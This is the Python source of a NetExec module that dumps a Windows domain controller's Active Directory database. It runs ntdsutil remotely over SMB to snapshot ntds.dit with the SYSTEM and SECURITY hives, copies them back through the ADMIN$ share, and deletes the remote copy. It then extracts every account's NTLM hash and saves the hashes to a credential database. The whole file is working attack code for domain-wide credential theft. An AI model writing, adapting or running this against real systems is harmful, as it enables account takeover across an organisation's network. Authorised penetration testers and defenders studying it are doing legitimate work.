import os
import shutil
import tempfile
import time

from impacket.examples.secretsdump import LocalOperations, NTDSHashes

from nxc.helpers.logger import highlight
from nxc.helpers.misc import validate_ntlm


class NXCModule:
    """
    Dump NTDS with ntdsutil
    Module by @zblurx

    """

    name = "ntdsutil"
    description = "Dump NTDS with ntdsutil"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = False

    def options(self, context, module_options):
        """
        Dump NTDS with ntdsutil
        Module by @zblurx

        DIR_RESULT  Local dir to write ntds dump. If specified, the local dump will not be deleted after parsing
        """
        self.share = "ADMIN$"
        self.tmp_dir = "C:\\Windows\\Temp\\"
        self.tmp_share = self.tmp_dir.split("C:\\Windows\\")[1]
        self.dump_location = str(time.time())[:9]
        self.dir_result = self.dir_result = tempfile.mkdtemp()
        self.no_delete = False

        if "DIR_RESULT" in module_options:
            self.dir_result = os.path.abspath(module_options["DIR_RESULT"])
            self.no_delete = True

    def on_admin_login(self, context, connection):
        command = f"powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full {self.tmp_dir}{self.dump_location}' q q\""
        context.log.display(f"Dumping ntds with ntdsutil.exe to {self.tmp_dir}{self.dump_location}")
        context.log.highlight("Dumping the NTDS, this could take a while so go grab a redbull...")
        context.log.debug(f"Executing command {command}")
        p = connection.execute(command, True)
        context.log.debug(p)
        if "success" in p:
            context.log.success(f"NTDS.dit dumped to {self.tmp_dir}{self.dump_location}")
        else:
            context.log.fail("Error while dumping NTDS")
            return

        os.makedirs(self.dir_result, exist_ok=True)
        os.makedirs(os.path.join(self.dir_result, "Active Directory"), exist_ok=True)
        os.makedirs(os.path.join(self.dir_result, "registry"), exist_ok=True)

        context.log.display(f"Copying NTDS dump to {self.dir_result}")

        context.log.debug("Copy ntds.dit to host")
        with open(os.path.join(self.dir_result, "Active Directory", "ntds.dit"), "wb+") as dump_file:
            try:
                connection.conn.getFile(
                    self.share,
                    f"{self.tmp_share}{self.dump_location}\\Active Directory\\ntds.dit",
                    dump_file.write,
                )
                context.log.debug("Copied ntds.dit file")
            except Exception as e:
                context.log.fail(f"Error while get ntds.dit file: {e}")

        context.log.debug("Copy SYSTEM to host")
        with open(os.path.join(self.dir_result, "registry", "SYSTEM"), "wb+") as dump_file:
            try:
                connection.conn.getFile(
                    self.share,
                    f"{self.tmp_share}{self.dump_location}\\registry\\SYSTEM",
                    dump_file.write,
                )
                context.log.debug("Copied SYSTEM file")
            except Exception as e:
                context.log.fail(f"Error while get SYSTEM file: {e}")

        context.log.debug("Copy SECURITY to host")
        with open(os.path.join(self.dir_result, "registry", "SECURITY"), "wb+") as dump_file:
            try:
                connection.conn.getFile(
                    self.share,
                    f"{self.tmp_share}{self.dump_location}\\registry\\SECURITY",
                    dump_file.write,
                )
                context.log.debug("Copied SECURITY file")
            except Exception as e:
                context.log.fail(f"Error while get SECURITY file: {e}")

        context.log.display(f"NTDS dump copied to {self.dir_result}")

        try:
            command = f"rmdir /s /q {self.tmp_dir}{self.dump_location}"
            p = connection.execute(command, True)
            context.log.success(f"Deleted {self.tmp_dir}{self.dump_location} remote dump directory")
        except Exception as e:
            context.log.fail(f"Error deleting {self.dump_location} remote directory on share {self.share}: {e}")

        local_operations = LocalOperations(f"{self.dir_result}/registry/SYSTEM")
        boot_key = local_operations.getBootKey()
        no_lm_hash = local_operations.checkNoLMHashPolicy()

        host_id = context.db.get_hosts(filter_term=connection.host)[0][0]

        def add_ntds_hash(ntds_hash, host_id):
            add_ntds_hash.ntds_hashes += 1
            if context.enabled:
                if "Enabled" in ntds_hash:
                    ntds_hash = ntds_hash.split(" ")[0]
                    context.log.highlight(ntds_hash)
            else:
                ntds_hash = ntds_hash.split(" ")[0]
                context.log.highlight(ntds_hash)
            if ntds_hash.find("$") == -1:
                if ntds_hash.find("\\") != -1:
                    domain, clean_hash = ntds_hash.split("\\")
                else:
                    domain = connection.domain
                    clean_hash = ntds_hash

                try:
                    username, _, lmhash, nthash, _, _, _ = clean_hash.split(":")
                    parsed_hash = f"{lmhash}:{nthash}"
                    if validate_ntlm(parsed_hash):
                        context.db.add_credential("hash", domain, username, parsed_hash, pillaged_from=host_id)
                        add_ntds_hash.added_to_db += 1
                        return
                    raise
                except Exception:
                    context.log.debug("Dumped hash is not NTLM, not adding to db for now ;)")
            else:
                context.log.debug("Dumped hash is a computer account, not adding to db")

        add_ntds_hash.ntds_hashes = 0
        add_ntds_hash.added_to_db = 0

        NTDS = NTDSHashes(
            f"{self.dir_result}/Active Directory/ntds.dit",
            boot_key,
            isRemote=False,
            history=False,
            noLMHash=no_lm_hash,
            remoteOps=None,
            useVSSMethod=True,
            justNTLM=True,
            pwdLastSet=False,
            resumeSession=None,
            outputFileName=connection.output_filename,
            justUser=None,
            printUserStatus=True,
            perSecretCallback=lambda secretType, secret: add_ntds_hash(secret, host_id),
        )

        try:
            context.log.success("Dumping the NTDS, this could take a while so go grab a redbull...")
            NTDS.dump()
            context.log.success(f"Dumped {highlight(add_ntds_hash.ntds_hashes)} NTDS hashes to {connection.output_filename}.ntds of which {highlight(add_ntds_hash.added_to_db)} were added to the database")

            context.log.display("To extract only enabled accounts from the output file, run the following command: ")
            context.log.display(f"grep -iv disabled {connection.output_filename}.ntds | cut -d ':' -f1")
        except Exception as e:
            context.log.fail(e)

        NTDS.finish()

        if self.no_delete:
            context.log.display(f"Raw NTDS dump copied to {self.dir_result}, parse it with:")
            context.log.display(f"secretsdump.py -system '{self.dir_result}/registry/SYSTEM' -security '{self.dir_result}/registry/SECURITY' -ntds '{self.dir_result}/Active Directory/ntds.dit' LOCAL")
        else:
            shutil.rmtree(self.dir_result)
